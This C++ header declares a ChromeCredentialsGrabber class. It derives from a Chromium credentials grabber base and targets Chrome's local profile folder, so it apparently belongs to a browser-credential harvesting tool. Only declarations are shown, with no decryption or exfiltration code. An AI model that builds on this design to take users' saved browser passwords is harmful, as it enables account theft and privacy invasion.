#pragma once
#include "ChromiumCredentialsGrabber.hpp"

class ChromeCredentialsGrabber final : public ChromiumCredentialsGrabber
{
public:
	explicit ChromeCredentialsGrabber();
	~ChromeCredentialsGrabber() override = default;
	ChromeCredentialsGrabber(const ChromeCredentialsGrabber&) = delete;
	ChromeCredentialsGrabber& operator=(const ChromeCredentialsGrabber&) = delete;
	ChromeCredentialsGrabber(ChromeCredentialsGrabber&&) = delete;
	ChromeCredentialsGrabber& operator=(ChromeCredentialsGrabber&&) = delete;

private:
	static constexpr auto CHROME_ROOT_FOLDER = L"%LOCALAPPDATA%/Google/Chrome/";

	[[nodiscard]] static std::filesystem::path get_local_chrome_path();

public:
	[[nodiscard]] std::wstring source() const override;
};
